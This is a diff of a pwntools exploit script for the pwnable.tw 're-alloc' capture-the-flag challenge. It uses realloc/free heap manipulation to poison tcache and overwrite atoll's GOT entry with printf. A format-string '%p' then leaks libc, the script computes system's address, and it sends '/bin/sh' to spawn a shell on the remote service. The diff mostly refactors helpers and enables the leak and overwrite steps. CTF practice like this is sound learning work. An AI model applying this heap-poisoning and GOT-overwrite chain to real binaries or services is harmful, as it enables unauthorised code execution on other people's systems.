@@ -12,27 +12,30 @@ class CHOICE(Enum):
 
 
 def choice(idx):
-  p.sendlineafter('Your choice: ', str(idx))
+  if isinstance(idx, Enum):
+    p.sendlineafter('Your choice: ', str(idx.value))
+  else:
+    p.sendlineafter('Your choice: ', str(idx))
 
 def alloc(idx, sz, cont):
-  choice(CHOICE.ALLOC.value)
+  choice(CHOICE.ALLOC)
   p.sendlineafter('Index:', str(idx))
   p.sendlineafter('Size:', str(sz))
   p.sendlineafter('Data:', cont)
 
 def realloc(idx, sz, cont=None):
-  choice(2)
+  choice(CHOICE.REALLOC)
   p.sendlineafter('Index:', str(idx))
   p.sendlineafter('Size:', str(sz))
   if cont:
     p.sendlineafter('Data:', cont)
 
 def free(idx):
-  choice(3)
+  choice(CHOICE.FREE)
   p.sendlineafter('Index:', str(idx))
 
 def leak_libc(offset = 0):
-  choice(1)
+  choice(CHOICE.ALLOC)
   if offset <= 0 or offset > 16:
     p.sendlineafter('Index:', '%p')
   else:
@@ -49,7 +52,7 @@ def trigger():
   p.sendlineafter('Your choice: ', '1')
   p.sendlineafter('Index:', '/bin/sh\x00')
 
-DEBUG = True
+DEBUG = False
 
 p = process('/home/len/pwnable/re-alloc')
 elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')
@@ -57,7 +60,7 @@ elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
 if not DEBUG:  
   p = remote('chall.pwnable.tw', 10106)
-  elf = ELF('./libc_32.so.6')  
+  elf = ELF('/home/len/pwnable/libc.so.6')  
   
 
 context.log_level = 'debug'
@@ -75,31 +78,43 @@ if __name__ == "__main__":
   realloc(0, 0x18, p64(atoll_got))
   alloc(1, 0x8, p64(atoll_got))
 
-  realloc(0, 0x38, p64(atoll_got))
+  realloc(0, 0x28, p64(atoll_got))
   free(0)
-  realloc(1, 0x38, p64(atoll_got))
+  realloc(1, 0x28, p64(atoll_got))
+  free(1)
+
+  alloc(0, 0x38, p64(atoll_got))
+  realloc(0, 0)  
+  realloc(0, 0x38, p64(atoll_got))
+  alloc(1, 0x38, p64(atoll_got))
+
+  realloc(0, 0x48, p64(atoll_got))
+  free(0)
+  realloc(1, 0x48, p64(atoll_got))
   free(1)
 
   pdb.set_trace()
-  alloc(0, 0x18, p64(printf_plt))
-  # realloc(0, 0)
-  # realloc(0, 0x8, p64(printf_plt))
+  alloc(0, 0x38, p64(printf_plt))
 
-  # addr = leak_libc(3)
-  # print('addr: {:#x}'.format(addr))
+  addr = leak_libc(3)
+  print('addr: {:#x}'.format(addr))
   # libc_base = p.libc.address
   # print('libc_base: {:#x}'.format(libc_base))
 
-  # libc_base = addr - libc_offset
-  # print('libc_base: {:#x}'.format(libc_base))
+  libc_base = addr - libc_offset
+  print('libc_base: {:#x}'.format(libc_base))
 
-  # system_addr = libc_base + system_offset
-  # print('system_addr: {:#x}'.format(system_addr))
+  system_addr = libc_base + system_offset
+  print('system_addr: {:#x}'.format(system_addr))
 
   # pdb.set_trace()
-  choice(2)
-  p.sendlineafter('Index:', '\x00')
-  p.sendlineafter('Size:', '\x00')
+  choice(1)
+  p.sendlineafter('Index:', '1\x00')
+  p.sendlineafter('Size:', 'a'*8+'\x00')
+  p.sendlineafter('Data:', p64(system_addr))
+  
+
+  trigger()
 
   # p.sendlineafter('Index:', 'a')
   # realloc(0, 0x8, p64(system_addr))
